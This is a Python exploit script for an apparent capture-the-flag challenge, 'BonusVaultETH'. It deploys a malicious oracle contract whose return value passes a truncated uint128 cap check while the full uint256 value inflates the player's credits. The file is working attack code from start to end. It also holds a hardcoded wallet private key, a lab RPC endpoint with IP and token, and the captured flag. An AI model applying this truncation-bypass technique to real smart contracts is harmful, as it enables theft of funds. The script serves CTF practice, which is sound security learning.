#!/usr/bin/env python3
"""
Author: CTF Solver
Purpose: Exploit type casting vulnerability in BonusVaultETH challenge
Created: 2025-11-20 13:35:00 UTC
Last Updated: 2025-11-20 13:35:00 UTC

Expected Result: Get credits > MAX_BONUS (100 ether) to solve the challenge
Produced Result: Successfully exploited! Credits: ~340 quintillion ETH > 100 ETH
                 Flag: HTB{L0wB1t5_P4ss3d_H1ghBit5_Expl0d3d_eb0419c430a0cd136eff0eea2c65c34f}

Vulnerability: BonusVaultETH.claimBonus() casts delta to uint128 for the cap check
but adds the full uint256 value to credits, allowing us to bypass the cap.
"""

from web3 import Web3
from solcx import compile_source, install_solc
import json

# Install solidity compiler
print("[*] Installing Solidity compiler...")
install_solc('0.8.24')

# Connection details from API
RPC_URL = "http://154.57.164.71:30162/rpc/97ea6efb-531f-4554-a36f-03dfa2fbf6ef"
PRIVKEY = "7a7a48df7199ac0c0913f3808f396f92b17363ea25f02d2472c5edcce40a89c2"
SETUP_ADDR = "0x24CEC82c2932D98bFC19F0571b718b9dd0a7e38a"
WALLET_ADDR = "0x27eC55Ed88C9fd64B12DBAa09B435A715B518925"

print(f"[*] Connecting to RPC: {RPC_URL}")
w3 = Web3(Web3.HTTPProvider(RPC_URL))

if not w3.is_connected():
    print("[-] Failed to connect to RPC")
    exit(1)

print(f"[+] Connected! Chain ID: {w3.eth.chain_id}")
print(f"[*] Player address: {WALLET_ADDR}")

# Get account from private key
account = w3.eth.account.from_key(PRIVKEY)
print(f"[+] Account loaded: {account.address}")

# Read and compile contracts
print("\n[*] Compiling contracts...")

# Read IOracleU interface
with open('IOracleU.sol', 'r') as f:
    ioracle_source = f.read()

# Read MaliciousOracle contract
with open('MaliciousOracle.sol', 'r') as f:
    malicious_oracle_source = f.read()

# Read BonusVaultETH for ABI
with open('BonusVaultETH.sol', 'r') as f:
    vault_source = f.read()

# Read Setup for ABI
with open('Setup.sol', 'r') as f:
    setup_source = f.read()

# Compile contracts separately
compiled_oracle = compile_source(
    malicious_oracle_source,
    output_values=['abi', 'bin'],
    solc_version='0.8.24',
    import_remappings=['.=.']
)

compiled_vault = compile_source(
    vault_source,
    output_values=['abi', 'bin'],
    solc_version='0.8.24',
    import_remappings=['.=.']
)

compiled_setup = compile_source(
    setup_source,
    output_values=['abi', 'bin'],
    solc_version='0.8.24',
    import_remappings=['.=.']
)

# Extract contract interfaces
malicious_oracle_interface = compiled_oracle['<stdin>:MaliciousOracle']
vault_interface = compiled_vault['<stdin>:BonusVaultETH']
setup_interface = compiled_setup['<stdin>:Setup']

print("[+] Contracts compiled successfully")

# Get Setup contract instance
setup_contract = w3.eth.contract(
    address=Web3.to_checksum_address(SETUP_ADDR),
    abi=setup_interface['abi']
)

# Get vault address from setup
vault_addr = setup_contract.functions.vault().call()
print(f"[*] Vault address: {vault_addr}")

# Create vault contract instance
vault_contract = w3.eth.contract(
    address=vault_addr,
    abi=vault_interface['abi']
)

# Check current credits
current_credits = vault_contract.functions.credits(WALLET_ADDR).call()
max_bonus = vault_contract.functions.MAX_BONUS().call()
print(f"[*] Current credits: {w3.from_wei(current_credits, 'ether')} ETH")
print(f"[*] MAX_BONUS: {w3.from_wei(max_bonus, 'ether')} ETH")

# Check if already solved
is_solved = setup_contract.functions.isSolved().call()
print(f"[*] Challenge already solved: {is_solved}")

if is_solved:
    print("[+] Challenge already solved!")
    exit(0)

# Deploy MaliciousOracle
print("\n[*] Deploying MaliciousOracle contract...")
MaliciousOracle = w3.eth.contract(
    abi=malicious_oracle_interface['abi'],
    bytecode=malicious_oracle_interface['bin']
)

# Get nonce
nonce = w3.eth.get_transaction_count(account.address)

# Build deploy transaction
deploy_txn = MaliciousOracle.constructor().build_transaction({
    'from': account.address,
    'nonce': nonce,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price,
})

# Sign and send
signed_txn = account.sign_transaction(deploy_txn)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
print(f"[*] Deploy transaction sent: {tx_hash.hex()}")

# Wait for receipt
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
oracle_addr = tx_receipt.contractAddress
print(f"[+] MaliciousOracle deployed at: {oracle_addr}")

# Create oracle contract instance
oracle_contract = w3.eth.contract(
    address=oracle_addr,
    abi=malicious_oracle_interface['abi']
)

# Test what the oracle returns
oracle_value = oracle_contract.functions.adjust(WALLET_ADDR).call()
print(f"[*] Oracle returns: {oracle_value}")
print(f"[*] Oracle value (hex): {hex(oracle_value)}")
print(f"[*] As uint128: {oracle_value & ((1 << 128) - 1)}")
print(f"[*] As uint128 in ether: {w3.from_wei(oracle_value & ((1 << 128) - 1), 'ether')} ETH")

# Call claimBonus with malicious oracle
print("\n[*] Calling claimBonus with malicious oracle...")
nonce = w3.eth.get_transaction_count(account.address)

claim_txn = vault_contract.functions.claimBonus(oracle_addr).build_transaction({
    'from': account.address,
    'nonce': nonce,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price,
})

signed_txn = account.sign_transaction(claim_txn)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
print(f"[*] Claim transaction sent: {tx_hash.hex()}")

# Wait for receipt
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"[+] Transaction confirmed in block {tx_receipt.blockNumber}")

# Check new credits
new_credits = vault_contract.functions.credits(WALLET_ADDR).call()
print(f"\n[*] New credits: {new_credits}")
print(f"[*] New credits in ether: {w3.from_wei(new_credits, 'ether')} ETH")

# Check if solved
is_solved = setup_contract.functions.isSolved().call()
print(f"\n[*] Challenge solved: {is_solved}")

if is_solved:
    print("[+] SUCCESS! Challenge is solved!")
    print("[+] Credits are now greater than MAX_BONUS!")
else:
    print("[-] Challenge not solved yet")
    print(f"[-] Credits: {w3.from_wei(new_credits, 'ether')} ETH")
    print(f"[-] MAX_BONUS: {w3.from_wei(max_bonus, 'ether')} ETH")
